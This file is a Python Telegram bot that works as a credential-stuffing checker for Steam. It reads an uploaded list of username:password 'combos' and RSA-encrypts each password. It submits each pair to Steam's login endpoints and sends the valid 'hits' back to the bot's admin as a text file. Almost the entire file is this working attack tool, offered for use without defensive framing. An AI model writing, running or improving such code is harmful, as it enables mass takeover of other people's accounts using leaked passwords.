#!/usr/bin/env python3
import os
import asyncio
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import FSInputFile
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from pathlib import Path
import aiohttp
import aiofiles
import re
import base64
from bs4 import BeautifulSoup
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from urllib.parse import quote_plus

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 0))

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

class States(StatesGroup):
    waiting_combo = State()

stats = {"valid": 0, "total": 0}

def rsa_encrypt(password, modulus, exponent):
    n = int(modulus, 16)
    e = int(exponent, 16)
    key = RSA.construct((n, e))
    cipher = PKCS1_v1_5.new(key)
    encrypted = cipher.encrypt(password.encode())
    return base64.b64encode(encrypted).decode()

async def check_steam(combo: str) -> dict:
    try:
        user, pwd = combo.split(':', 1)
        async with aiohttp.ClientSession() as session:
            async with session.post("https://steamcommunity.com/login/getrsakey/", 
                                  data={"username": user}) as r:
                data = await r.json()
                if not data.get("success"):
                    return {}
                
                mod = data["publickey_mod"]
                exp = data["publickey_exp"]
                
                enc_pwd = rsa_encrypt(pwd, mod, exp)
                payload = {
                    "password": enc_pwd,
                    "username": user,
                    "rsatimestamp": data["timestamp"]
                }
                
                async with session.post("https://steamcommunity.com/login/dologin/", data=payload) as r2:
                    result = await r2.json()
                    if result.get("success"):
                        return {"username": user, "password": pwd, "status": "valid"}
        return {}
    except:
        return {}

@dp.message(Command("start"))
async def start_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return await msg.reply("❌ Admin only")
    
    await msg.reply("📁 Send combo file (.txt)")

@dp.message(F.document, States.waiting_combo)
async def handle_combo(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    
    file = await bot.download(msg.document.file_id, "combos.txt")
    combos = []
    
    async with aiofiles.open("combos.txt") as f:
        async for line in f:
            combo = line.strip()
            if ':' in combo:
                combos.append(combo)
    
    await state.update_data(combos=combos)
    await msg.reply(f"✅ Loaded {len(combos)} combos\n⏳ Checking...")
    
    results = []
    total = len(combos)
    
    for i, combo in enumerate(combos):
        result = await check_steam(combo)
        if result:
            results.append(result)
        
        percent = ((i+1)/total)*100
        await msg.edit_text(
            f"🔍 Checking... {i+1}/{total} ({percent:.1f}%)\n"
            f"✅ Valid: {len(results)}"
        )
    
    # Save & send
    Path("results").mkdir(exist_ok=True)
    async with aiofiles.open("results/hits.txt", "w") as f:
        for r in results:
            await f.write(f"{r['username']}:{r['password']}\n")
    
    await bot.send_document(ADMIN_ID, FSInputFile("results/hits.txt"))
    await msg.edit_text(f"✅ Done! {len(results)} hits sent!")
    await state.clear()

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
